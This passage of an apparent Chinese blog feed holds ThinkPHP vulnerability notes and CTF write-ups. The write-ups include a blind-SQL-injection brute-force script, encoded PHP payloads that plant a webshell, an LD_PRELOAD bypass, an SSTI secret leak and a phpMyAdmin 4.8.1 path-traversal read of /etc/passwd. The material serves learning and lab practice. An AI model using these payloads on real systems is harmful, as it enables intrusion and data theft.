<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Db::table(&#x27;think_user&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;find();//查询</span><br><span class="line">$data = [&#x27;foo&#x27; =&gt; &#x27;bar&#x27;, &#x27;bar&#x27; =&gt; &#x27;foo&#x27;];</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;insert($data);//增加数据</span><br><span class="line">Db::name(&#x27;user&#x27;)</span><br><span class="line">    -&gt;where(&#x27;id&#x27;, 1)</span><br><span class="line">    -&gt;update([&#x27;name&#x27; =&gt; &#x27;thinkphp&#x27;]);//更新数据</span><br><span class="line">Db::table(&#x27;think_user&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;delete();//删除数据    </span><br></pre></td></tr></table></figure>

<p>查询表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(&#x27;字段名&#x27;,&#x27;查询表达式&#x27;,&#x27;查询条件&#x27;);</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>tp反序列化</title>
    <url>/2023/02/17/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>1.在index控制器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function fanxuliehua()</span><br><span class="line">    &#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">        unserialize($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟进save方法</span><br><span class="line"></span><br><span class="line">public function save(array $data = [], string $sequence = null): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 数据对象赋值</span><br><span class="line">        $this-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">        if (false === $result) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 写入回调</span><br><span class="line">        $this-&gt;trigger(&#x27;AfterWrite&#x27;);</span><br><span class="line"></span><br><span class="line">        // 重新记录原始数据</span><br><span class="line">        $this-&gt;origin   = $this-&gt;data;</span><br><span class="line">        $this-&gt;get      = [];</span><br><span class="line">        $this-&gt;lazySave = false;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进$this-&gt;updateDate()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function updateData(): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 事件回调</span><br><span class="line">        if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;checkData();</span><br><span class="line"></span><br><span class="line">        // 获取有更新的数据</span><br><span class="line">        $data = $this-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">        if (empty($data)) &#123;</span><br><span class="line">            // 关联更新</span><br><span class="line">            if (!empty($this-&gt;relationWrite)) &#123;</span><br><span class="line">                $this-&gt;autoRelationUpdate();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;</span><br><span class="line">            // 自动写入更新时间</span><br><span class="line">            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();</span><br><span class="line">            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检查允许字段</span><br><span class="line">        $allowFields = $this-&gt;checkAllowFields();</span><br></pre></td></tr></table></figure>

<p>代码会寻找更新的数据，$this-&gt;data不为空,然后$this-&gt;trigger(‘BeforeWrite’)的值需要为true</p>
<p>看检查字段的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function db($scope = []): Query</span><br><span class="line">    &#123;</span><br><span class="line">        /** @var Query $query */</span><br><span class="line">        $query = self::$db-&gt;connect($this-&gt;connection)</span><br><span class="line">            -&gt;name($this-&gt;name . $this-&gt;suffix)</span><br><span class="line">            -&gt;pk($this-&gt;pk);</span><br></pre></td></tr></table></figure>

<p>在checkAllowFields中有一个db方法</p>
<p>字符串拼接符号<code>$this-&gt;name . $this-&gt;suffix</code> ，可以利用其触发<code>__toString</code></p>
<p>__toString方法在Conversion类里</p>
<p>最后发现可控的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$closure = $this-&gt;withAttr[$fieldName];</span><br><span class="line"> $value   = $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure>

<p>可以控制<code>$this-&gt;withAttr</code>，那么就等同于控制了<code>$closure</code></p>
]]></content>
  </entry>
  <entry>
    <title>做题笔记FinalFeb</title>
    <url>/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/</url>
    <content><![CDATA[<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>测试了一下，select，table等都被过滤</p>
<p>扫描发现存在robots.txt，里面写了hint.txt，里面的内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$black_list = “/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|’|=| |in|&lt;|&gt;|-|.|()|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i”;</span><br><span class="line"></span><br><span class="line">If $_POST[‘passwd’] === admin’s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>

<p>发现过滤了很多东西，而且需要我们传正确的passwd才能得到flag。</p>
<p>首先发现没有过滤反斜杠，因此可以转义单引号。但是过滤了<code># - &#39;</code>这三个东西，我们就没法将最后多出来的单引号给去掉。</p>
<p>查资料发现了可以%00截断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&#x27;\&#x27;&amp;passwd=&#x27;||(1);%00&#x27;</span><br></pre></td></tr></table></figure>

<p>如果在输入框中直接输入%00，那么就会被编码成%2500，然后计算机在解码成%00，会黑名单过滤</p>
<p>发现现当第一个字符为y的时候，会跳转到welcome.php，而且select，table等都被过滤，也没发现绕过的方法，所以写脚本进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line">url=&#x27;http://53a779e0-8dee-4239-a6f3-854a1756af10.node4.buuoj.cn:81/&#x27;</span><br><span class="line"></span><br><span class="line">strs = string.ascii_letters+string.digits+&quot;_&quot;</span><br><span class="line">result=&#x27;&#x27;</span><br><span class="line">payload=&quot;||(passwd/**/regexp**/0x&#123;&#125;);&quot;</span><br><span class="line">#payload=&quot;||(username/**/regexp/**/0x&#123;&#125;);&quot;</span><br><span class="line">while 1:</span><br><span class="line">    for j in strs:</span><br><span class="line">        p1=&quot;^&quot;+result+j</span><br><span class="line">        p2=bytes(p1,&#x27;UTF-8&#x27;)</span><br><span class="line">        pp=p2.hex()</span><br><span class="line">        ppp=payload.format(pp)</span><br><span class="line">        zero=unquote(&quot;%00&quot;, &#x27;utf-8&#x27;)</span><br><span class="line">        ppp+=zero</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;\\&quot;,</span><br><span class="line">            &quot;passwd&quot;:ppp</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        #print(r)</span><br><span class="line">        #break</span><br><span class="line">        if &quot;welcome&quot; in r:</span><br><span class="line">            result+=j</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">    #print(data)</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>

<p>发现eval()，应该是用system等函数来实现命令执行。<br>但是得要先绕过preg_match()中正则表达式的限制</p>
<p>题目是要绕过preg_match()中正则表达式的限制并getshell，查资料考虑异或绕过，但是这个题可以使用urlencode绕过，异或比较麻烦</p>
<p>异或的原理，先使用urlencode绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure>

<p>构造一个phpinfo看一下PHP版本以及禁用函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p>发现system被禁止了，但是可以使用assert()，先用urlencode绕过传一个webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>命令是assert(eval($_POST[‘a’]));</p>
<p>可以连接，需要执行readflag才能得到flag，但是无法执行</p>
<p>查资料，，，利用linux提供的LD_preload环境变量，上传exp到&#x2F;tmp,在启动子进程的时候，新的子进程会加载上传的so文件，然后我们可以在so里面定义同名函数</p>
<p>然后后面先包含bypass_disablefunc.php文件定义同名函数，运行readflag文件，输出的path在tmp文件中</p>
<p>&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目的提示</p>
<p>flag in &#x2F;fllllllllllllag，打开&#x2F;welcome.txt，render()函数想到ssti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>

<p>需要找到cookie_secret，观察网址，发现有filehash，修改filehash值，跳转到error页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现’cookie_secret’: ‘f3055f32-25bc-4292-8b24-a15db7e1dbe6’}</p>
<p>读文件的格式都是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/文件名&amp;filehash=</span><br></pre></td></tr></table></figure>

<p>在hints.txt中filehash的提示</p>
<p>md5(f3055f32-25bc-4292-8b24-a15db7e1dbe6+md5(fllllllllllllag))</p>
<p>为filehash的值</p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>扫描到存在phpinfo(),phpmyadmin数据库管理页面，尝试访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/Users\86151\myBlog\source_posts\做题笔记FinalFeb\1111.jpg" alt="1111"></p>
<p>查询到<code>4.8.1</code>版本存在任意文件读取漏洞：</p>
<p>在server_sql.php页面执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo()?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>php生成session时，会生成在&#x2F;tmp目录下，且以sess_开头，例如：&#x2F;tmp&#x2F;sess_be9f3bebfb7ab4192fd07c479cf6b171，其中记录着用户的操作:session文件的值也就对应了 HTTP 请求 Cookie 中phpMyAdmin的值。SQL语句被记录下来，在服务器解析该文件时，会被当作php代码执行。尝试包含session文件会使执行的SQL查询被当作了PHP代码执行。</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>可以成功执行，获取到了passwd文件的内容，尝试查找flag</p>
<p><img src="/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/Users\86151\myBlog\source_posts\做题笔记FinalFeb\222.jpg" alt="222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>basename()会返回路径重的文件名部分。&#x2F;index.php&#x2F;config.php使用basename()之后返回config.php。<br>basename()会去掉文件名开头的非ASCII值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">basename(&quot;xffconfig.php&quot;)=config.php</span><br></pre></td></tr></table></figure>

<p>flag在config.php中，可以通过highlight_file(basename($_SERVER[‘PHP_SELF’]));来显示config.php；</p>
<p>查wp说$message &#x3D; ‘Congratulations! The flag is: ‘ . FLAG;之前要满足随机数什么的，难度太大，不选择这个方法。<br>可以使用不可显字符绕过正则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>匹配尾部的可以通过不可显字符绕过，比如%ff来绕过正则匹配</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>tp6.0任意文件操作漏洞</title>
    <url>/2023/03/02/tp6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>1</p>
<p>1</p>
<p>14</p>
<p>安装tp6.0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=<span class="number">6.0</span>.<span class="number">0</span> tp6.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>如果端口被占用无法安装，可以先在环境变量里删去http那一个变量然后重新安装</p>
<p>漏洞：</p>
<p>可以看到官方对<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php</strong>中在<strong>id</strong>设置时多增加了一个函数，因此猜测可能是在存储<strong>Session</strong>时导致了文件写入</p>
<p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php</strong>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">clearFlashData</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getId</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看到有一个write方法，跟进<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFileName</span>(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeFile</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用了writefile</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$content</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">bool</span>) <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>, <span class="variable">$content</span>, LOCK_EX);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>file_put_contents</strong>可以写入文件</p>
<p>在Filephp中可知在save()中调用了write方法，所以filename为$sessionId，所以filename来自getId()方法，write中的data来在writefile中的$content</p>
<p>然后跟进一下getid方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getId</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>找到$this-&gt;id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function setId($id = null): void</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>发现id需要为32位</p>
<p>找到控制id的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Session初始化</span></span><br><span class="line">        <span class="variable">$varSessionId</span> = <span class="variable language_">$this</span>-&gt;app-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">        <span class="variable">$cookieName</span>   = <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$varSessionId</span> &amp;&amp; <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$cookieName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">setId</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">withSession</span>(<span class="variable">$this</span>-&gt;session);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Response $response */</span></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">setSession</span>(<span class="variable">$this</span>-&gt;session);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app-&gt;cookie-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$cookieName</span>, <span class="variable">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">getId</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>if ($sessionId) {<br>            $this-&gt;session-&gt;setId($sessionId);<br>        }</strong></p>
<p>发现id来自sessionid，找到getname方法，sessionid&#x3D;session name&#x3D;PHPSESSID</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// session name</span></span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>           =&gt; <span class="string">&#x27;PHPSESSID&#x27;</span>,</span><br><span class="line">    <span class="comment">// SESSION_ID的提交变量,解决flash上传跨域</span></span><br></pre></td></tr></table></figure>

<p>所以PHPSESSID就是filename的值</p>
]]></content>
  </entry>
  <entry>
    <title>tp5.0漏洞</title>
    <url>/2023/03/03/tp5-0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>tp5.1.x漏洞</title>
    <url>/2023/03/03/tp5-1-x%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>漏洞的起点为&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php的__destruct()</p>
<p>__destruct()的<code>removeFiles()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>file_exists</code>函数可以知道<code>$filename</code>会被作为字符串处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>toJson()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;toArray()，跟进</p>
